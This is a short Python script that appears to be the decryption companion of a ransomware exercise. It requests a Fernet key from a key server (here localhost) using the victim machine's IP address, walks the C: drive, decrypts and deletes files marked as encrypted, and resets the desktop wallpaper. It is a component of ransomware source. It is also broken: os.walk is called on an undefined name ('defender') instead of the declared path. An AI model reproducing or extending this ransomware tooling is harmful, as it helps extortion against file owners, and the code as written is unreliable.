from cryptography.fernet import Fernet
import os
import requests
import socket
import ctypes

image_path = os.path.abspath('C:/image/image.jpg') # Path to wallpaper image
path = os.path.abspath('c:/') # Path from where we start decrypt
server_address = 'http://127.0.0.1:8000/storage/get_key'
ip = socket.gethostbyname(socket.gethostname()) # Our own ip to send it to server
data = {'ip_to_decrypt':ip} # Data to send to server

# Get key from server
with requests.Session() as s:
	post = s.post(server_address, data = data)
key = post.text.encode()

# Decrypt files
for roots, dirs, files in os.walk(defender):
	try:
		os.chdir(roots)
		print(os.getcwd())
		if 'System32' in roots or 'Task_6' in roots or 'python' in roots:
			pass 
		else:
			for file in files:
				with open(file, 'rb') as f:
					data = f.read()
				fernet = Fernet(key)
				decrypted = fernet.decrypt(data)
				with open (file.split('encrypted')[0],'wb') as f:
					f.write(decrypted)
				os.remove(file)
	except PermissionError:
		pass
	except OSError:
		pass

# Change wallpaper
STI_SETDESKWALLPAPER = 20
ctypes.windll.user32.SystemParametersInfoW(STI_SETDESKWALLPAPER,0,image_path,3) 